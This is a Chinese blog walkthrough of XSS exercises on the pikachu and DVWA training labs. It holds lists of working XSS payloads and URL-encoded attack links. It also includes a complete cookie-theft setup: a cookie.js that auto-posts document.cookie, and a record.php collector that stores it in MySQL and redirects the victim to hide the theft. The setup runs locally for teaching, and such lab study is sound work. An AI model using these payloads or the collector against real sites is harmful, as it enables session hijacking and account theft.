<!DOCTYPE HTML>
<html lang="zh_CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="XSS pikachu">
    <meta name="description" content="pikachu_XSS
这绝对是篇假的pikachu_xss攻略，我敢保证绝对没有人会写这么水的文章。

我想说的是：这篇可能看确实起来过于杂乱无章，摸不着头脑，有些不够详尽。一方面是因为我想前几篇写的很详细，另一方面我想填一下前面几篇的坑">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>XSS_进阶 | Lu-sakura</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">
    
    <script src="/libs/jquery/jquery.min.js"></script>
    
<meta name="generator" content="Hexo 4.1.0"><link rel="alternate" href="/atom.xml" title="Lu-sakura" type="application/atom+xml">
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper head-container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Lu-sakura</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>主页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>档案</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友链</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>

<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Lu-sakura</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			主页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			档案
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友链
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>

        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">XSS_进阶</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        height: calc(100vh - 250px);
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #toc-content .is-active-link::before {
        background-color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/pikachu-XSS/">
                                <span class="chip bg-color">pikachu_XSS</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
                    2020-01-27
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
                    954
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
                    3 Min
                </div>
                
				
                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
            
        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="pikachu-XSS"><a href="#pikachu-XSS" class="headerlink" title="pikachu_XSS"></a>pikachu_XSS</h1><blockquote>
<p><strong>这绝对是篇假的pikachu_xss攻略</strong>，我敢保证绝对没有人会写这么水的文章。</p>
</blockquote>
<p><strong>我想说的是</strong>：这篇可能看确实起来过于杂乱无章，摸不着头脑，有些不够详尽。一方面是因为我想前几篇写的很详细，另一方面我想填一下前面几篇的坑。前面几篇力主详细和操作简单化，并未讨论一些深层次的东西。这篇我就想对前面两篇做个扩展，我想更深一层次的带大家去探究XSS利用和提升对XSS认识。</p>
<p><strong>（注：由于我才能不足，这里的探究也是很初级，至于对XSS认识的提升也是对于小白来说的，希望各位大佬勿怪。）</strong></p>
<h2 id="前言：这篇是为了提升你们对XSS攻击认识写的"><a href="#前言：这篇是为了提升你们对XSS攻击认识写的" class="headerlink" title="前言：这篇是为了提升你们对XSS攻击认识写的"></a>前言：这篇是为了提升你们对XSS攻击认识写的</h2><p><strong>基本面原理和初始我在前面两篇打DVWA的时候都已经叨叨过了，</strong></p>
<p><strong>那我再这里就不在BB废话了。 直接开撸╮(￣▽￣)╭</strong></p>
<h3 id="反射型XSS（GET）"><a href="#反射型XSS（GET）" class="headerlink" title="反射型XSS（GET）"></a>反射型XSS（GET）</h3><p>进入到界面后发现是个搜索栏，于是乎就随手。。。。</p>
<p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-09_22-18-28.png" alt></p>
<p>我擦，好像有点意思，那咱还废啥话。干它！</p>
<p>正当我payload的输入一半的时候，我发现突然怎么也输进去了。。。WHAT发生了什么？？？</p>
<p>只见我灵光一闪，嘿嘿，F12。。。（注：这里的输入框限制了前端输入最多只能20个字符，我们按照老方法F12改一下。如果忘掉具体怎么的话，那就在回翻一下我打DVWA那篇博客，这里我就不多讲了）</p>
<p>然后随而来的就是一个个弹窗 ｂ（￣▽￣）ｄ</p>
<pre class=" language-JavaScript"><code class="language-JavaScript"><svg/onload=alert(1)>
<iframe onload=alert(123)>
<body onLoad="alert('XSS');"
<script>alert(/xss/)</script>
<img src=x onerror=alert(hack)>
<--`<img/src=` onerror=alert(1)> --!>
<iframe src="javascript:alert('xss');"></iframe>
<ScRiPt%20%0A%0D>alert(561177485777)%3B</ScRiPt>
<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 50, 51, 41))</script>
<script ^__^>alert(String.fromCharCode(49))</script ^__^
#输入这个过后会自动跳到百度
<script>document.location=("http://baidu.com")</script>
#下面的是需要二次触发才能弹窗
<math href="javascript:javascript:alert(1)">CLICKME</math> 
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
#这是我魔改过的
<img width="10000px" height="10000px" src=i onmouseover="alert(document.cookie)">
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)"></code></pre>
<p><strong>我就不再多举例了，这里仅仅作为扩展，自己有兴趣可以单门去收集一下XSS相关payload。</strong></p>
<h3 id="反射型XSS（POST）"><a href="#反射型XSS（POST）" class="headerlink" title="反射型XSS（POST）"></a>反射型XSS（POST）</h3><p><strong>相对于反射型XSS(GET)，这里只不过需要抓包然后再输入payload。这里呢，我就不给大家在做过多输入payload演示了。（注：把上边的payload直接拿过来用就行。）</strong></p>
<p>我是那种会水的人吗？肯定不是的啦。那么接下来我带大家思考个问题吧。</p>
<h4 id="思考：XSS难道就会弹窗？？？"><a href="#思考：XSS难道就会弹窗？？？" class="headerlink" title="思考：XSS难道就会弹窗？？？"></a>思考：XSS难道就会弹窗？？？</h4><p>这个问题也是我在打DVWA的时候留给学弟的问题。那今天我就在这里跟大家一起讨论一下吧。</p>
<p>说道xss攻击利用，<strong>对于web安全初识者</strong>来说肯定会很懵逼。xss不就是弹个窗吗，不就是能扰乱前端吗，在厉害点也就获取个cookie，那有啥特殊的。（大佬勿喷，我这里说的是小白对xss认识）</p>
<p>其实不然，xss漏洞的危害很大程度取决于xss漏洞发生的位置和攻击者对漏洞的利用。xss漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TP10 的排名中一直属于前三的江湖地位·。xss漏洞发生后一般是对用户造成巨大安全隐患，如发生大规模xss蠕虫事件，钓鱼事件，cookie盗取事件，浏览器劫持事件等，但有些还可以结合浏览器自身漏洞和服务器漏洞获取webshell。那我们来几个案例吧，有兴趣的话可以自行搜索一下美团的xss蠕虫事件（这个属于经典案例），QQ经常出现的盗号风波（属于时长发生在身边的），还有经常访问某些小网站会不自主跳到其他界面（这个是你最纳闷的）。</p>
<h4 id="思考：我们是怎样受到攻击的"><a href="#思考：我们是怎样受到攻击的" class="headerlink" title="思考：我们是怎样受到攻击的"></a>思考：我们是怎样受到攻击的</h4><p>那么我们就来测试一下这个吧。<strong>首先打开你的DVWA，并把等级设成low，接着在url栏输入这行代码。</strong></p>
<p><strong><code>（注：因为皮卡丘可能不是每个人都有，所以这里我就用 DVWA 来讲吧）</code></strong></p>
<p>将下面代码复制粘贴到url栏中。</p>
<pre><code>127.0.0.1/DVWA/vulnerabilities/xss_r/?name=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%28%22%68%74%74%70%3a%2f%2f%62%61%69%64%75%2e%63%6f%6d%22%29%3c%2f%73%63%72%69%70%74%3e#</code></pre><p>你发现了什么？你会发现你的浏览器会先打开DVWA的界面，然后就一闪而过，最终停留在百度的界面。</p>
<p><strong>你仔细看看这个url结构，是不是很像一条普通访问DVWA的url。你明明是在访问DVWA,怎么就跑百度去了？？？</strong></p>
<p>那到底发生了什么呢？？？接着我带你一步步揭开这个问题的迷雾（到我装逼的时候了）</p>
<p>不知道刚才大家在对反射型XSS(GET)测试的时候有没有注意到下面这条payload</p>
<pre class=" language-JavaScript"><code class="language-JavaScript">#输入这个过后会自动跳到百度
<script>document.location=("http://baidu.com")</script></code></pre>
<p>你打开DVWA的反射型XSS界面，把这段payload输入进去，你会发现似曾相识的感觉<strong>︿(￣︶￣)︿</strong>，</p>
<p>这是因为你又一次经历了刚才的的事<strong>(Ｔ▽Ｔ)</strong>。</p>
<p>你把我刚才给你的url进行解码得到如下代码</p>
<pre><code>127.0.0.1/DVWA/vulnerabilities/xss_r/?name=&lt;script&gt;document.location=(&quot;http://baidu.com&quot;)&lt;/script&gt;#</code></pre><p>眼不眼熟，发现问题了么你？？？</p>
<p><strong>这不就是我刚才让你在DVWA反射型xss那里自己输入的payload被带到了url里了吗。</strong></p>
<p><strong>我想说的是，</strong>有些时候我们会在不知情的情况下访问一条未知的url，就像刚才你输了我给的URL，明明看起来像是一条打开DVWA的url，却被不明其因的被带到百度。如果我给你一条能获取你cookie的url呢？那你是不是就受到了攻击啊！</p>
<h3 id="储存型XSS"><a href="#储存型XSS" class="headerlink" title="储存型XSS"></a>储存型XSS</h3><p><strong>payload还是那几条，原理我也就不详细的说了，用法呢也很简单，直接复制粘贴得了。</strong></p>
<p>唉，我也不想水，谁让我原先讲的很详细呢。没办法啊<strong>(ಥ_ಥ)</strong></p>
<p>难道我是那种写文章会水的人？？？这么好的学习机会那咱也别闲着</p>
<h4 id="思考：那么我们的cookie是怎么被获取的呢"><a href="#思考：那么我们的cookie是怎么被获取的呢" class="headerlink" title="思考：那么我们的cookie是怎么被获取的呢"></a>思考：那么我们的cookie是怎么被获取的呢</h4><p><strong>首先打开你的DVWA，并把等级设成low，接着在url栏输入这行代码。</strong></p>
<p><code>（注：因为皮卡丘可能不是每个人都有，所以这里我就用 DVWA 来讲吧）</code></p>
<p>将下面代码复制粘贴到url栏中。（<strong>首先声明</strong>，这只是一条普通的会弹窗的xss而已，并不会对你发起攻击）</p>
<pre><code>http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3c%2f%73%63%72%69%70%74%3e</code></pre><p>你会发现我去，他怎弹出了你的cookie啊，你什么都没干啊。这是怎回事？？？</p>
<p>老样子，这条url绝对不正经，经过url解码你会发现我给你发送的是一条这样的payload，如下</p>
<pre><code>http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;#</code></pre><p><strong>回到我们的问题，</strong>我们研究的问题是怎样盗取cookie。那么经过刚才的事例，我想你会发现，你通过浏览不知名的url导致浏览器弹出你的DVWA的cookie。那么同理如果攻击者给你一条会获取你cookie并发送到远程主机的xss payload，当你在不知情点击这条url的时候，那攻击者是不是就直接获取到你的cookie了呢。</p>
<h4 id="思考：我们怎么能实现盗取cookie并保存"><a href="#思考：我们怎么能实现盗取cookie并保存" class="headerlink" title="思考：我们怎么能实现盗取cookie并保存"></a>思考：我们怎么能实现盗取cookie并保存</h4><p>既然要盗取cookie并保存，那么我们就需要一个能想远端主机发送cookie的payload和一个能接受cookie的环境。那么接下来请跟着我的步骤一步步动手搭建吧。（<strong>先打开你的DVWA，并把等级设成low，</strong>）</p>
<p><strong>（注：我这里将接受cookie的代码还放在了本地，为了降低你们你们的操作难度）</strong></p>
<p>首先现在你网站根目录下创建一个XSS_cookie的目录</p>
<p>然后再创建一个cookie.js  将下面代码复制到cookie.js 里面并保存</p>
<pre class=" language-javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;form action='http://127.0.0.1/XSS_cookie/record.php' name='exploit' method='post' style='display:none'>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;input type='hidden' name='data' value='"</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">+</span><span class="token string">"'>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;/form>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>exploit<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>接着我们再创建一个接受cookie的PHP脚本命名为record.php ， 将下面代码复制到record.php  里面并保存。</p>
<p>（注：这各个脚本也是放在XSS_cookie的目录下面）</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$conn</span><span class="token operator">=</span><span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token string">"XSS_cookie"</span><span class="token punctuation">,</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"insert into record(cookie) values('"</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"');"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">mysql_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"insert into record(cookie) values('"</span><span class="token punctuation">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"');"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">mysql_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span>
<span class="token punctuation">{</span>
    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"select * from record"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"获取到的cookie:"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">mysql_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">header</span><span class="token punctuation">(</span>"Location<span class="token punctuation">:</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/DVWA");//重定向到一个可信的网站，让受害者不知情</span>
<span class="token delimiter">?></span></code></pre>
<p>接着我们打打开cmd,进入到mysql中依次输入以下命令</p>
<pre class=" language-mysql"><code class="language-mysql">create database XSS_cookie;
use XSS_cookie;
create table record(id int not null auto_increment primary key,cookie varchar(100) not null);</code></pre>
<p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-10_13-31-58.png" alt></p>
<p>好了我们一切环境都妥当了。那么就请你复制下面的url并打开吧。</p>
<pre><code>127.0.0.1/DVWA/vulnerabilities/xss_r/?name=%3c%73%63%72%69%70%74%20%73%72%63%3d%68%74%74%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%2f%58%53%53%5f%63%6f%6f%6b%69%65%2f%63%6f%6f%6b%69%65%2e%6a%73%3e%3c%2f%73%63%72%69%70%74%3e%23</code></pre><p>你会发现你进入到了DVWA的首届面，但是你这url不像是进入首界面的啊。</p>
<p>那接着你在mysql中查询record中的数据，你会发现你的cookie在不知情的情况下被记录保存了</p>
<p>(注：我测试了两次所以会有两条，你们初次测试只有一条，也就是没测试一次记录一条。)</p>
<p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-10_13-35-18.png" alt></p>
<p>这到底是什么原因呢？？？按照前两次对url解码探究的经验，我们得到如下url</p>
<pre><code>127.0.0.1/DVWA/vulnerabilities/xss_r/?name=&lt;script src=http://127.0.0.1/XSS_cookie/cookie.js&gt;&lt;/script&gt;#</code></pre><p>发现是个反射型xss攻击，SRC指向的URL绝对有猫腻，那么我们追踪看一下，这个是指向我刚才让你在网站跟目下建的XSS_cookie 的文件夹里的cookie.js.这段个cookie.js会打开record.php，而record.php这个脚本就会记录下你的cookie。</p>
<p><strong>我想说的是：</strong>你设想一下，如果这XSS_cookie这个目录及脚本被放在了攻击者的远端服务器下，你再访问这个相应的文件的时候你说会怎样？那你的cookie是不是就被保存到了攻击者的远端服务器下了，那么攻击者就可以拿着你的cookie伪装成你的身份去访问网页了。</p>
<p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-10_00-28-24.png" alt></p>
<p>（<strong>注：其实本该用两台机器完成的，</strong>但是我为了降低你们复现的难度就简化了攻击流程，单门设计了这个能在本地就完成的测试。那就委屈一下你的电脑吧，既要当受害者还要当攻击者，唉，它太难了。<strong>答应我等你复现成功后记得安慰一下你的电脑。</strong>）</p>
<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>虽然上篇关于DVWA_DOM_XSS讲的很详尽，但是我不能再水了，再水我的心会难受。呜呜。。。我是一个有良心的作者</p>
<p><strong>（DOM型XSS种类繁多，情景也各种各样，那接着我就在再次带领你们温习一下吧）</strong></p>
<h4 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM_XSS_"></a>DOM_XSS_</h4><p>首先进入界面，发现是个常规的搜索栏，那我们就随便输点东西吧，F12看看</p>
<p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-10_14-23-10.png" alt></p>
<p>发现我们输入的东西被存到了a标签的herf 属性里面。然后还发现一段绿色水印下的一段js 代码，如下：</p>
<pre class=" language-JavaScript"><code class="language-JavaScript"><script>
  function domxss(){
     var str = document.getElementById("text").value;
     document.getElementById("dom").innerHTML = "<a href='"+str+"'>what do you see?</a>";
      }                    //在这里我们将变量str 的前面的" ' 还有a标签的> 闭合   
                          //试试：'><img src="#" onmouseover="alert('xss')">
                          //试试：' onclick="alert('xss')">,闭合掉就行
</script></code></pre>
<p>不难发现这个地方存在DOM型XSS，那我们简单分析一下代码吧</p>
<p>我们输入的东西，经提交过后被赋值给变量str，str在将参数传到a标签的herf 属性里面。这里没有任何安全防范措施。那么，我们就以这为入手点构建闭合的前端代码生成payload。<strong>（ 构建方法在注释里）</strong></p>
<p><strong>下面是测试payload</strong></p>
<pre class=" language-JavaScript"><code class="language-JavaScript">需要点击二次触发
#' onclick="alert(/xss/)"

需要鼠标移动到图片上（魔改版）
'><img width="10000px" height="10000px"  src="#" onmouseover="alert('xss')" >

直接触发xss（魔改版）
" '><svg/onload=alert(1)></code></pre>
<p><strong>接下来我们再来一个DOM演示</strong></p>
<h4 id="DOM-XSS-X"><a href="#DOM-XSS-X" class="headerlink" title="DOM_XSS_X"></a>DOM_XSS_X</h4><p>进入后和刚才的界面一样，于是乎我随手就一个123456.。。。欸，有意思，看来鲨师傅是个有故事的人啊。。。                      嘿嘿，老样子F12一下看看前端代码，如下图所示</p>
<p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-10_15-44-17.png" alt></p>
<p>发现我们原先将的反射型XSS有点相似啊，再看绿色水印下有一段JavaScript代码，那我们一起看看吧</p>
<pre class=" language-JavaScript"><code class="language-JavaScript"><script>
    function domxss(){
        var str = window.location.search;
        var txss = decodeURIComponent(str.split("text=")[1]);
        var xss = txss.replace(/\+/g,' ');
        document.getElementById("dom").innerHTML = "<a href='"+xss+"'>就让往事都随风,都随风吧</a>";
        }           //在这里我们将变量xss的前面的" ' 还有a标签的> 闭合   
                    //试试：'><img src="#" onmouseover="alert('xss')">
